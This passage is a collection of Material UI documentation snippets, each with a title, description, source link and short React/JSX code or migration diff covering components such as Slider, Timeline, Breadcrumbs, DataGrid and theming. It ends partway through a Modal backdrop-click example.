Always Visible Label on Slider in React\nDESCRIPTION: Shows how to force the thumb label to be always visible on a slider using the 'valueLabelDisplay' prop in Material-UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/slider/slider.md#2025-04-22_snippet_6\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"DiscreteSliderLabel.js\"}\n```\n\n----------------------------------------\n\nTITLE: Configuring Fade Transition with unmountOnExit\nDESCRIPTION: Example showing how to optimize performance by enabling the unmountOnExit prop on a Fade transition component. This prevents mounting of expensive component trees when not visible.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/transitions/transitions.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n<Fade in={false} unmountOnExit />\n```\n\n----------------------------------------\n\nTITLE: Adding Custom Margin to MUI Slider using JSX\nDESCRIPTION: This code snippet demonstrates how to customize the vertical margin of the Material-UI Slider component using the sx prop in JSX. It sets a vertical margin ('my: 1') to add spacing above and below the Slider, enhancing layout flexibility within a React component. Requires @mui/material as a dependency and expects that the Slider component is imported from this library. No input is required; the output is a React element with the adjusted margin styling applied.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/experiments/blog/blog.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\n// add margin: 8px 0px;\n<Slider sx={{ my: 1 }} />\n```\n\n----------------------------------------\n\nTITLE: Downloading the Material UI Gatsby Example\nDESCRIPTION: Command to download the Material UI Gatsby example from GitHub and navigate to the project directory.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/material-ui-gatsby/README.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ncurl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2  material-ui-master/examples/material-ui-gatsby\ncd material-ui-gatsby\n```\n\n----------------------------------------\n\nTITLE: Migrating Date and Time Picker Imports in JavaScript\nDESCRIPTION: This snippet demonstrates how to update import statements when migrating Date and Time Picker components from @mui/lab to @mui/x-date-pickers or @mui/x-date-pickers-pro. It shows the changes needed for both individual and bulk imports.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/lab-date-pickers-to-mui-x.md#2025-04-22_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\n-import DatePicker from '@mui/lab/DatePicker';\n+import { DatePicker } from '@mui/x-date-pickers/DatePicker';\n\n-import DateRangePicker from '@mui/lab/DateRangePicker';\n+import { DateRangePicker } from '@mui/x-date-pickers-pro/DateRangePicker';\n\n-import { DatePicker, DateRangePicker } from '@mui/lab';\n+import { DatePicker } from '@mui/x-date-pickers';\n+import { DateRangePicker } from '@mui/x-date-pickers-pro';\n// DatePicker is also available in `@mui/x-date-pickers-pro`\n```\n\n----------------------------------------\n\nTITLE: Setting Letter Spacing in Material-UI with JSX\nDESCRIPTION: Shows how to adjust letter spacing using the Box component in Material-UI. The values represent the space between characters in pixels.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/typography/typography.md#2025-04-22_snippet_7\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ letterSpacing: 6 }}>…\n<Box sx={{ letterSpacing: 10 }}>…\n```\n\n----------------------------------------\n\nTITLE: Setting Flex Grow with Material-UI Box Component in JSX\nDESCRIPTION: Shows how to make flex items grow to fill available space using the flexGrow property. Items with flexGrow: 1 will expand to fill any remaining space in the container.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/flexbox/flexbox.md#2025-04-22_snippet_7\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ flexGrow: 1 }}>Item 1</Box>\n<Box>Item 2</Box>\n<Box>Item 3</Box>\n```\n\n----------------------------------------\n\nTITLE: Initializing Isolated Demo with ThemeProvider in Material-UI (JavaScript)\nDESCRIPTION: This snippet defines a React component demonstrating how to use Material-UI's ThemeProvider to create a locally themed and isolated demo environment. It imports core theming utilities and uses props to configure the provider, allowing for encapsulation from the main documentation theme. Prerequisites include @mui/material/styles and React, with custom theme options adjustable within the ThemeProvider. It expects props for theme isolation and outputs a wrapped demo area within the provided theme context.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/experiments/docs/demos.md#2025-04-22_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport { ThemeProvider, createTheme, useColorScheme } from '@mui/material/styles';\\n\\nfunction ModeToggle() {\\n  const { mode, setMode } = useColorScheme();\\n}\\n\\nexport default function DemoIsolated(props) {\\n  return (\\n    <ThemeProvider\\n      {...props}\\n      theme={createTheme({\\n        // ...custom theme\\n      })}\\n    >\\n      ...\\n    </ThemeProvider>\\n  );\\n}\\n\n```\n\n----------------------------------------\n\nTITLE: Customizing Timeline Component in React\nDESCRIPTION: Provides an example of customizing the Timeline component using Material-UI's customization options.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/timeline/timeline.md#2025-04-22_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\"demo\": \"CustomizedTimeline.js\"}\n```\n\n----------------------------------------\n\nTITLE: Updating Breakpoint Usage in Material-UI v5\nDESCRIPTION: This snippet shows how to update breakpoint usage in theme utilities and the Hidden component. It adjusts the breakpoint keys to match the new behavior in v5, where breakpoints are treated as values instead of ranges.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_48\n\nLANGUAGE: diff\nCODE:\n```\n-theme.breakpoints.down('sm') // '@media (max-width:959.95px)' - [0, sm + 1) => [0, md)\n+theme.breakpoints.down('md') // '@media (max-width:959.95px)' - [0, md)\n```\n\nLANGUAGE: diff\nCODE:\n```\n-theme.breakpoints.between('sm', 'md') // '@media (min-width:600px) and (max-width:1279.95px)' - [sm, md + 1) => [0, lg)\n+theme.breakpoints.between('sm', 'lg') // '@media (min-width:600px) and (max-width:1279.95px)' - [0, lg)\n```\n\nLANGUAGE: diff\nCODE:\n```\n-theme.breakpoints.between('sm', 'xl') // '@media (min-width:600px)'\n+theme.breakpoints.up('sm') // '@media (min-width:600px)'\n```\n\nLANGUAGE: diff\nCODE:\n```\n-<Hidden smDown>{...}</Hidden> // '@media (min-width:600px)'\n+<Hidden mdDown>{...}</Hidden> // '@media (min-width:600px)'\n```\n\n----------------------------------------\n\nTITLE: Creating Outlined Timeline in React\nDESCRIPTION: Demonstrates an outlined version of the timeline component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/timeline/timeline.md#2025-04-22_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\"demo\": \"OutlinedTimeline.js\"}\n```\n\n----------------------------------------\n\nTITLE: Importing Stack Component in Joy UI (JSX)\nDESCRIPTION: Basic import statement for the Stack component from Joy UI library.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/stack/stack.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Stack from '@mui/joy/Stack';\n```\n\n----------------------------------------\n\nTITLE: Creating Condensed Breadcrumbs with Menu in React\nDESCRIPTION: Shows how to implement condensed breadcrumbs with a dropdown menu, providing an alternative way to display long navigation paths.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/breadcrumbs/breadcrumbs.md#2025-04-22_snippet_5\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"CondensedWithMenu.js\"}\n```\n\n----------------------------------------\n\nTITLE: Updating ListItem Class Names for Button States in React\nDESCRIPTION: Changes needed to update class names for button states that were moved from ListItem to ListItemButton in Material UI v6.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/upgrade-to-v6.md#2025-04-22_snippet_15\n\nLANGUAGE: diff\nCODE:\n```\n-import { listItemClasses } from '@mui/material/ListItem';\n+import { listItemButtonClasses } from '@mui/material/ListItemButton';\n\n-listItemClasses.button\n+listItemButtonClasses.root\n\n-listItemClasses.focusVisible\n+listItemButtonClasses.focusVisible\n\n-listItemClasses.disabled\n+listItemButtonClasses.disabled\n\n-listItemClasses.selected\n+listItemButtonClasses.selected\n```\n\n----------------------------------------\n\nTITLE: Ref Forwarding Class Component Pattern\nDESCRIPTION: Shows how to properly forward refs in class components to avoid React.StrictMode warnings when using Material UI components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/guides/composition/composition.md#2025-04-22_snippet_4\n\nLANGUAGE: diff\nCODE:\n```\n class Component extends React.Component {\n   render() {\n-    const { props } = this;\n+    const { forwardedRef, ...props } = this.props;\n     return <div {...props} ref={forwardedRef} />;\n   }\n }\n\n-export default Component;\n+export default React.forwardRef((props, ref) => <Component {...props} forwardedRef={ref} />);\n```\n\n----------------------------------------\n\nTITLE: Customizing Speed Dial Icon in React\nDESCRIPTION: Demonstrates how to provide custom icons for closed and open states of the Speed Dial using the SpeedDialIcon component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/speed-dial/speed-dial.md#2025-04-22_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\"demo\": \"OpenIconSpeedDial.js\"}\n```\n\n----------------------------------------\n\nTITLE: Using the Standalone DateField Component in MUI X v6 (JSX)\nDESCRIPTION: This snippet shows how to import the `DateField` component from the `@mui/x-date-pickers/DateField` package and render it as a standalone input field. It demonstrates basic usage with a `label` prop. This component is part of the MUI X v6 revamp, offering improved usability over previous masked inputs.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/v6-beta-pickers.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport { DateField } from '@mui/x-date-pickers/DateField';\n\n<DateField label=\"My first field\" />;\n```\n\n----------------------------------------\n\nTITLE: Implementing Accessible Checkboxes in React\nDESCRIPTION: Demonstrates how to add accessibility attributes to checkboxes when a label can't be used.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/checkboxes/checkboxes.md#2025-04-22_snippet_10\n\nLANGUAGE: JSX\nCODE:\n```\n<Checkbox\n  value=\"checkedA\"\n  inputProps={{\n    'aria-label': 'Checkbox A',\n  }}\n/>\n```\n\n----------------------------------------\n\nTITLE: Adding Icons to React Breadcrumbs\nDESCRIPTION: Shows how to incorporate icons into Breadcrumbs for enhanced visual representation of navigation hierarchy.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/breadcrumbs/breadcrumbs.md#2025-04-22_snippet_3\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"IconBreadcrumbs.js\"}\n```\n\n----------------------------------------\n\nTITLE: Passing Props to DataGrid Slots using `componentsProps` in React (JSX)\nDESCRIPTION: This JSX snippet demonstrates how to pass custom props to an internal component (slot) of the MUI DataGrid using the `componentsProps` prop. It specifically passes `{ columnsSort: 'asc' }` to the `filterPanel` slot, customizing the column sorting behavior directly within the DataGrid definition. This approach avoids creating separate wrapper components for simple prop overrides. Requires React and MUI DataGrid.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/making-customizable-components.md#2025-04-22_snippet_6\n\nLANGUAGE: jsx\nCODE:\n```\n<DataGrid\n  componentsProps={{\n    filterPanel: {\n      columnsSort: 'asc',\n    },\n  }}\n/>\n```\n\n----------------------------------------\n\nTITLE: Updating Grid Import Statements for Material UI v7\nDESCRIPTION: Shows how to update import statements when migrating from GridLegacy to Grid in Material UI v7.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-grid-v2/upgrade-to-grid-v2.md#2025-04-22_snippet_0\n\nLANGUAGE: diff\nCODE:\n```\n// The legacy Grid component is named GridLegacy\n-import Grid from '@mui/material/GridLegacy';\n\n// The updated Grid component is named Grid\n+import Grid from '@mui/material/Grid';\n```\n\n----------------------------------------\n\nTITLE: Customizing Box with MUI System Props\nDESCRIPTION: Shows how to customize the Box component using MUI System properties as direct props. This allows for applying CSS utilities directly as component props.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/components/box/box.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\n{\"demo\": \"BoxSystemProps.js\", \"defaultCodeOpen\": true }\n```\n\n----------------------------------------\n\nTITLE: Implementing Timeline with Opposite Content in React\nDESCRIPTION: Illustrates how to display content on opposite sides of the timeline.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/timeline/timeline.md#2025-04-22_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\"demo\": \"OppositeContentTimeline.js\"}\n```\n\n----------------------------------------\n\nTITLE: Customizing the DataGrid Toolbar with Styled Components - React JSX\nDESCRIPTION: This example demonstrates how to customize the DataGrid toolbar in previous MUI X versions by using styled-components. The custom GridToolbarContainerStyled applies extra padding only when the component has the .MuiDataGrid-toolbarContainer class, due to higher CSS specificity requirements. Dependencies include MUI X's DataGrid and styling utilities, and the example expects a React environment. The App component renders a DataGrid with the custom toolbar in a styled container, and key props include components={{ Toolbar: MyCustomToolbar }} to override the default toolbar.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/mui-x-v5.md#2025-04-22_snippet_0\n\nLANGUAGE: JSX\nCODE:\n```\nconst GridToolbarContainerStyled = styled(GridToolbarContainer)({\n  '&.MuiDataGrid-toolbarContainer': {\n    padding: 40,\n  },\n});\n\nfunction MyCustomToolbar() {\n  return (\n    <GridToolbarContainerStyled>My custom toolbar</GridToolbarContainerStyled>\n  );\n}\n\nexport default function App() {\n  return (\n    <div style={{ height: 400, width: '100%' }}>\n      <DataGrid components={{ Toolbar: MyCustomToolbar }} />\n    </div>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Fixing white-space: nowrap Issues in Stack (JSX)\nDESCRIPTION: Demonstrates the solution to the white-space: nowrap conflict by setting minWidth: 0 on the Stack component, which keeps the text within the container boundaries.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/stack/stack.md#2025-04-22_snippet_5\n\nLANGUAGE: jsx\nCODE:\n```\n<Stack direction=\"row\" sx={{ minWidth: 0 }}>\n  <Typography noWrap>\n```\n\n----------------------------------------\n\nTITLE: Configuring Default Wave Animation for Skeleton Components\nDESCRIPTION: Example of configuring theme defaults to set 'wave' animation as the default for all Skeleton components in a Joy UI application. Uses the CssVarsProvider and extendTheme utilities.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/skeleton/skeleton.md#2025-04-22_snippet_1\n\nLANGUAGE: js\nCODE:\n```\nimport { CssVarsProvider, extendTheme } from '@mui/joy/styles';\n\nconst theme = extendTheme({\n  components: {\n    JoySkeleton: {\n      defaultProps: {\n        animation: 'wave',\n      },\n    },\n  },\n});\n\nfunction App() {\n  return (\n    <CssVarsProvider theme={theme}>\n      <Skeleton />{' '}\n      {/* The Skeleton component will have the wave animation by default */}\n    </CssVarsProvider>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Responsive Button Group Spacing\nDESCRIPTION: Example of implementing responsive spacing in ButtonGroup using breakpoint objects.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/button-group/button-group.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\n<ButtonGroup spacing={{ xs: 0, sm: 1, md: '2rem' }}>...</ButtonGroup>\n```\n\n----------------------------------------\n\nTITLE: Handling Multiple Snackbars with Escape Key\nDESCRIPTION: Example demonstrating how to handle multiple Snackbar instances and their dismissal using the Escape key.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/snackbars/snackbars.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\nexport default function MyComponent() {\n  const [open, setOpen] = React.useState(true);\n\n  return (\n    <React.Fragment>\n      <Snackbar\n        open={open}\n        onClose={(event, reason) => {\n          // `reason === 'escapeKeyDown'` if `Escape` was pressed\n          setOpen(false);\n          // call `event.preventDefault` to only close one Snackbar at a time.\n        }}\n      />\n      <Snackbar open={open} onClose={() => setOpen(false)} />\n    </React.Fragment>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Left-Aligned Timeline in React\nDESCRIPTION: Demonstrates how to adjust the Timeline component to be left-aligned within its container.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/timeline/timeline.md#2025-04-22_snippet_8\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\"demo\": \"LeftAlignedTimeline.js\"}\n```\n\n----------------------------------------\n\nTITLE: Creating Styled Component Slots with Joy UI\nDESCRIPTION: Demonstrates how to create styled component slots using Joy UI's styled API with name and slot parameters for a statistics component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/creating-themed-components/creating-themed-components.md#2025-04-22_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nimport * as React from 'react';\nimport { styled } from '@mui/joy/styles';\n\nconst StatRoot = styled('div', {\n  name: 'JoyStat', // The component name\n  slot: 'root', // The slot name\n})(({ theme }) => ({\n  display: 'flex',\n  flexDirection: 'column',\n  gap: theme.spacing(0.5),\n  padding: theme.spacing(3, 4),\n  backgroundColor: theme.vars.palette.background.surface,\n  borderRadius: theme.vars.radius.sm,\n  boxShadow: theme.vars.shadow.md,\n}));\n\nconst StatValue = styled('div', {\n  name: 'JoyStat',\n  slot: 'value',\n})(({ theme }) => ({\n  ...theme.typography.h2,\n}));\n\nconst StatUnit = styled('div', {\n  name: 'JoyStat',\n  slot: 'unit',\n})(({ theme }) => ({\n  ...theme.typography['body-sm'],\n  color: theme.vars.palette.text.tertiary,\n}));\n```\n\n----------------------------------------\n\nTITLE: Migrating from Extended Fab Button to Fab Component\nDESCRIPTION: Diff showing the migration from Button with variant='extendedFab' to the Fab component with variant='extended'.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v3/migration-v3.md#2025-04-22_snippet_14\n\nLANGUAGE: diff\nCODE:\n```\n-import Button from '@material-ui/core/Button';\n-<Button variant=\"extendedFab\" />\n+import Fab from '@material-ui/core/Fab';\n+<Fab variant=\"extended\" />\n```\n\n----------------------------------------\n\nTITLE: Styling Components with Variants\nDESCRIPTION: Example of creating styled components with variant-based conditional styling.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/experimental-api/pigment-css/pigment-css.md#2025-04-22_snippet_9\n\nLANGUAGE: javascript\nCODE:\n```\nimport { styled } from '@pigment-css/react';\n\nconst Heading = styled('div')({\n  fontSize: '2rem',\n  color: '#9FADBC',\n  fontWeight: 'bold',\n  margin: '1rem',\n  variants: [\n    {\n      props: { variant: 'success' },\n      style: { color: '#23AD79' },\n    },\n    {\n      props: { size: 'small' },\n      style: { fontSize: '1.5rem' },\n    },\n  ],\n});\n```\n\n----------------------------------------\n\nTITLE: Updating Default Breakpoint Sizes in Material-UI v5\nDESCRIPTION: This snippet shows the changes to default breakpoint sizes in Material-UI v5. It provides a diff of the old and new values, as well as a code example for reverting to the old breakpoint values if desired.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_49\n\nLANGUAGE: diff\nCODE:\n```\n {\n   xs: 0,\n   sm: 600,\n-  md: 960,\n+  md: 900,\n-  lg: 1280,\n+  lg: 1200,\n-  xl: 1920,\n+  xl: 1536,\n }\n```\n\nLANGUAGE: javascript\nCODE:\n```\nimport { createTheme } from '@mui/material/styles';\n\nconst theme = createTheme({\n  breakpoints: {\n    values: {\n      xs: 0,\n      sm: 600,\n      md: 960,\n      lg: 1280,\n      xl: 1920,\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Creating Icon Avatars in React\nDESCRIPTION: Demonstrates how to create icon avatars by passing an icon as 'children' to the Avatar component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/avatars/avatars.md#2025-04-22_snippet_4\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"IconAvatars.js\"}\n```\n\n----------------------------------------\n\nTITLE: Implementing Global Reset with CssBaseline in React\nDESCRIPTION: This snippet demonstrates how to use the CssBaseline component to apply a global reset in a React application. It wraps the entire application to ensure consistent styling across all elements.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/css-baseline/css-baseline.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport * as React from 'react';\nimport CssBaseline from '@mui/material/CssBaseline';\n\nexport default function MyApp() {\n  return (\n    <React.Fragment>\n      <CssBaseline />\n      {/* The rest of your application */}\n    </React.Fragment>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a Type-Safe forwardRef Shim for React 18 and 19 Compatibility - TSX\nDESCRIPTION: Implements a compatibility shim to wrap React components with a type-safe `forwardRef`, enforcing correct prop usage across React 18 and 19. The shim ensures refs are always present in the component props object and calls the appropriate rendering function. It provides stronger type-checking for TypeScript and protects against incorrect ref overrides caused by prop spreading order in React 19. Dependencies: React, TypeScript, `reactMajor` value. Usage: wraps functional components needing a ref. Parameters: `render` (React.ForwardRefRenderFunction). Outputs: a ref-enabled component. Limitation: Forwards only the single ref parameter; does not handle multiple refs directly.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/react-19-update.md#2025-04-22_snippet_2\n\nLANGUAGE: tsx\nCODE:\n```\n// Compatibility shim that ensures stable props object for forwardRef components\n// Fixes https://github.com/facebook/react/issues/31613\n// We ensure that the ref is always present in the props object (even if that's not the case for older versions of React) to avoid the footgun of spreading props over the ref in the newer versions of React.\nexport const forwardRef = <T, P = {}>(\n  render: React.ForwardRefRenderFunction<T, P & { ref: React.Ref<T> }>,\n) => {\n  if (reactMajor >= 19) {\n    const Component = (props: any) => render(props, props.ref ?? null);\n    Component.displayName = render.displayName ?? render.name;\n    return Component as React.ForwardRefExoticComponent<P>;\n  }\n  return React.forwardRef(\n    render as React.ForwardRefRenderFunction<T, React.PropsWithoutRef<P>>,\n  );\n};\n```\n\n----------------------------------------\n\nTITLE: Accessing DOM Elements with Refs in Material UI\nDESCRIPTION: Example showing how to access DOM elements of Material UI components using React refs.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/getting-started/faq/faq.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\n// or a ref setter function\nconst ref = React.createRef();\n// render\n<Button ref={ref} />;\n// usage\nconst element = ref.current;\n```\n\n----------------------------------------\n\nTITLE: Customizing Autocomplete Slot Properties\nDESCRIPTION: Shows how to customize specific slots within the Autocomplete component using slotProps. This example sets different variants for the component and its listbox.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/autocomplete/autocomplete.md#2025-04-22_snippet_3\n\nLANGUAGE: js\nCODE:\n```\n<Autocomplete\n  variant=\"plain\"\n  slotProps={{\n    listbox: {\n      variant: 'outlined',\n    },\n  }}\n/>\n```\n\n----------------------------------------\n\nTITLE: Running @mui/system Synthetic Benchmark\nDESCRIPTION: Command to run the MUI system benchmark with performance comparisons between styling system implementations from styled-system/css, chakra-ui, and MUI's styleFunctionSx. The chakra-ui implementation shows the highest performance.\nSOURCE: https://github.com/mui/material-ui/blob/master/benchmark/server/README.md#2025-04-22_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\npnpm server:system\n\n@styled-system/css x 64,606 ops/sec ±0.45% (188 runs sampled)\n@chakra-ui/system/css x 126,272 ops/sec ±0.21% (191 runs sampled)\n@mui/system styleFunctionSx x 40,867 ops/sec ±0.50% (191 runs sampled)\n```\n\n----------------------------------------\n\nTITLE: Configuring Theme for Portals in Shadow DOM\nDESCRIPTION: This code snippet shows how to configure the Material UI theme to render portals inside the shadow DOM container for components like Menu, Dialog, and Popover.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/shadow-dom/shadow-dom.md#2025-04-22_snippet_1\n\nLANGUAGE: tsx\nCODE:\n```\nconst theme = createTheme({\n  components: {\n    MuiPopover: {\n      defaultProps: {\n        container: shadowRootElement,\n      },\n    },\n    MuiPopper: {\n      defaultProps: {\n        container: shadowRootElement,\n      },\n    },\n    MuiModal: {\n      defaultProps: {\n        container: shadowRootElement,\n      },\n    },\n  },\n});\n\n// ...\n\n<ThemeProvider theme={theme}>\n  <App />\n</ThemeProvider>;\n```\n\n----------------------------------------\n\nTITLE: Box Component System Props Example\nDESCRIPTION: Demonstration of using MUI System properties directly as props on the Box component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/box/box.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\nimport Box from '@mui/joy/Box';\n\n<Box px={2} py={1} bgcolor=\"primary.500\">\n  This Box uses system props for padding and background color.\n</Box>\n```\n\n----------------------------------------\n\nTITLE: Installing Dependencies for Material-UI Sign-up Template\nDESCRIPTION: Lists the required dependencies for implementing the sign-up template in a Material-UI project. These include core Material-UI packages and Emotion for styling.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/getting-started/templates/sign-up/README.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n@mui/material, @mui/icons-material, @emotion/styled, @emotion/react\n```\n\n----------------------------------------\n\nTITLE: Setting ID on Autocomplete Root Element in JSX\nDESCRIPTION: Two equivalent examples showing how to set an ID on the root element of an Autocomplete component, either directly or using slotProps.root.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/overriding-component-structure/overriding-component-structure.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n<Autocomplete id=\"badge1\">\n```\n\nLANGUAGE: jsx\nCODE:\n```\n<Autocomplete slotProps={{ root: { id: 'badge1' } }}>\n```\n\n----------------------------------------\n\nTITLE: Renaming Grid Justify Prop in React\nDESCRIPTION: Renames the 'justify' prop to 'justifyContent' on Grid components to align with CSS property naming.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_16\n\nLANGUAGE: diff\nCODE:\n```\n-<Grid justify=\"center\">\n+<Grid justifyContent=\"center\">\n```\n\n----------------------------------------\n\nTITLE: Installing Material UI Icons Package Dependencies\nDESCRIPTION: Command to install the Material Icons package along with its required dependencies including Material UI core and Emotion packages.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-icons-material/README.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nnpm install @mui/icons-material @mui/material @emotion/styled @emotion/react\n```\n\n----------------------------------------\n\nTITLE: Rendering RichTreeView Component with Multi-Select - React JSX\nDESCRIPTION: This code snippet depicts usage of the RichTreeView React component using a 'items' prop populated with the hierarchical dataset 'myDataSet'. The 'multiSelect' prop enables selection of multiple tree items at once. Requires the RichTreeView component from MUI X v7, the defined dataset, and a React environment. The expected input is a properly formatted hierarchical data array; output is a rendered tree view component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/mui-x-v7.md#2025-04-22_snippet_1\n\nLANGUAGE: JSX\nCODE:\n```\n<RichTreeView items={myDataSet} multiSelect />\n```\n\n----------------------------------------\n\nTITLE: Customizing Surplus Avatars in AvatarGroup\nDESCRIPTION: Shows how to use the 'renderSurplus' prop to customize the surplus avatar in an AvatarGroup, useful for rendering surplus based on server data.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/avatars/avatars.md#2025-04-22_snippet_9\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"CustomSurplusAvatars.js\"}\n```\n\n----------------------------------------\n\nTITLE: Enabling Kept Mounted Modal in React\nDESCRIPTION: This code shows how to keep the Modal content mounted even when closed, which can be useful for SEO or rendering expensive component trees.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/modal/modal.md#2025-04-22_snippet_1\n\nLANGUAGE: JSX\nCODE:\n```\n<Modal keepMounted />\n```\n\n----------------------------------------\n\nTITLE: Container Query API Methods in Material UI\nDESCRIPTION: Demonstrates various container query methods available in the Material UI breakpoints API, including up, down, only, between, and not.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/container-queries/container-queries.md#2025-04-22_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\n// For default breakpoints\ntheme.containerQueries.up('sm'); // => '@container (min-width: 600px)'\ntheme.containerQueries.down('md'); // => '@container (max-width: 900px)'\ntheme.containerQueries.only('md'); // => '@container (min-width: 600px) and (max-width: 900px)'\ntheme.containerQueries.between('sm', 'lg'); // => '@container (min-width: 600px) and (max-width: 1200px)'\ntheme.containerQueries.not('sm'); // => '@container (max-width: 600px)'\n```\n\n----------------------------------------\n\nTITLE: Styling with Global CSS Class Names\nDESCRIPTION: Example of styling Material UI components by targeting the generated class names directly in a global CSS file, allowing for component-wide styling without explicit class assignments.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/interoperability/interoperability.md#2025-04-22_snippet_5\n\nLANGUAGE: CSS\nCODE:\n```\n.MuiSlider-root {\n  color: #20b2aa;\n}\n\n.MuiSlider-root:hover {\n  color: #2e8b57;\n}\n```\n\nLANGUAGE: JSX\nCODE:\n```\nimport * as React from 'react';\nimport Slider from '@mui/material/Slider';\nimport './GlobalCssSlider.css';\n\nexport default function GlobalCssSlider() {\n  return <Slider defaultValue={30} />;\n}\n```\n\n----------------------------------------\n\nTITLE: Handling Modal Backdrop Clicks with onClose Callback\nDESCRIPTION: Demonstrates how to handle backdrop clicks in Modal components using the onClose callback, which replaces the deprecated onBackdropClick prop.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v7/upgrade-to-v7.md#2025-04-22_snippet_20\n\nLANGUAGE: jsx\nCODE:\n```\nfunction Example() {\n  const [open, setOpen] = React.useState(false);\n\n  const handleClose = (event, reason) => {\n    if (reason === 'backdropClick') {\n      // Handle the backdrop click\n    }\n    setOpen(false);\n  };\n\n  return (\n    <Modal open={open} onClose={handleClose}>\n     